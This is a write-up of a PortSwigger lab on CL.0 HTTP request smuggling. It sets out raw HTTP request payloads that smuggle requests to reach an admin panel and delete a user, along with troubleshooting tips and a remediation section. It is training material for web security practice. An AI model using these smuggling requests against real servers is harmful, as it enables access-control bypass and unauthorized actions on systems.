# Lab 19: Exploiting HTTP Request Smuggling with a CL.0 Attack

**Category:** HTTP Request Smuggling
**Difficulty:** Practitioner
**Lab link:** [Exploiting HTTP request smuggling with a CL.0 attack](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)

## Overview

In a CL.0 attack the back-end server completely ignores the `Content-Length` header on certain endpoints. The front-end dutifully forwards the full request body to the back-end, but the back-end processes only the headers and leaves the body bytes sitting in the TCP buffer. Those bytes become a prefix for the next request on the same keep-alive connection, causing the back-end to interpret an attacker-controlled request line and headers.

**Goal:** Access `/admin` and delete carlos.

## Key Concepts

- **CL.0 vs CL.TE / TE.CL:** there is no Transfer-Encoding header involved. The back-end simply ignores Content-Length entirely on specific endpoints (usually static resources, redirects, or routes that don't read a body).
- **Finding the vulnerable endpoint:** not every endpoint is CL.0. Test static resources (JS/CSS files) that return 200. Send a POST with a small Content-Length but include a full smuggled request as the body. If the back-end ignores the body and the next request gets a poisoned response → CL.0 confirmed.
- **HTTP/1.1 only:** CL.0 is an HTTP/1.1 technique. Must use HTTP/1 in Burp Repeater, not HTTP/2.
- **Keep-alive required:** the smuggled bytes and the probe request must travel on the **same TCP connection**. Use Burp Repeater's "Send group in sequence (single connection)" feature.

## Solution

### Step 1 — Find a CL.0 endpoint

Browse the lab with Burp running. Find a static resource that returns 200 (e.g. `/resources/labheader/js/labHeader.js`). Switch Repeater to **HTTP/1**.

Test with a 1-byte body — if the back-end returns 200 immediately without timeout → candidate:
```
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: <lab>
Content-Length: 1
Connection: keep-alive

x
```

### Step 2 — Confirm CL.0 with a probe

Create a Burp Repeater tab group. Send both tabs in sequence on a **single connection**.

**Tab 1 — smuggling request:**
```
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Connection: keep-alive

GET /hopefully404 HTTP/1.1
Host: <lab>

```
(blank line after Host terminates the smuggled request's headers)

**Tab 2 — probe:**
```
GET / HTTP/1.1
Host: <lab>
```

If Tab 2 responds with **404** (instead of the homepage) → CL.0 confirmed. The smuggled `GET /hopefully404` was prepended to Tab 2's request by the back-end.

### Step 3 — Access /admin

Change the smuggled path to `/admin`:

**Tab 1:**
```
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
Connection: keep-alive

GET /admin HTTP/1.1
Host: <lab>

```

Tab 2's response will be the `/admin` page. Find the delete URL.

### Step 4 — Delete carlos

Smuggle `GET /admin/delete?username=carlos`:

**Tab 1:**
```
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Connection: keep-alive

GET /admin/delete?username=carlos HTTP/1.1
Host: <lab>

```

Tab 2's response confirms deletion. Lab solved.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `Protocol error` on Tab 1 | Sending HTTP/2 | Switch to HTTP/1 in Repeater |
| Tab 2 times out | Smuggled request missing blank line termination or Host header | Add `Host:` + blank line after it in the inner request |
| Tab 2 returns homepage (not 404) | Endpoint is not CL.0 | Try a different static resource |
| Tab 2 times out but Tab 1 is 200 | CL.0 is working but inner request is malformed | Fix the inner request format |

## CL.0 Content-Length Calculation

The outer `Content-Length` must equal the exact byte count of the smuggled request body. Count bytes carefully including `\r\n` line endings:

```
GET /admin HTTP/1.1\r\n       = 22 bytes
Host: <host>\r\n              = 6 + len(host) + 2 bytes
\r\n                          = 2 bytes
```

Use Burp's **right-click → Update Content-Length** to let Burp calculate it automatically.

## Remediation

- Configure the back-end to always respect `Content-Length` on POST requests.
- Reject requests where the declared `Content-Length` doesn't match the actual body received.
- Use HTTP/2 end-to-end (back-end to front-end) which eliminates Content-Length ambiguity.
- Disable HTTP/1.1 keep-alive on back-end connections if not required.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-19-cl0-attack/solve.py)

Uses raw TLS sockets to send the smuggling request and probe on the same connection, then sends the delete request.

## Key Takeaways

- CL.0 requires finding a specific endpoint where the back-end ignores Content-Length — not all endpoints qualify.
- Must use HTTP/1.1 keep-alive and send both requests on the **same connection**.
- The smuggled inner request needs `Host:` and a terminating blank line (`\r\n\r\n`) to be processed as a complete request.
- Timeout on the probe ≠ failure — it often means CL.0 is working but the inner request format needs fixing.
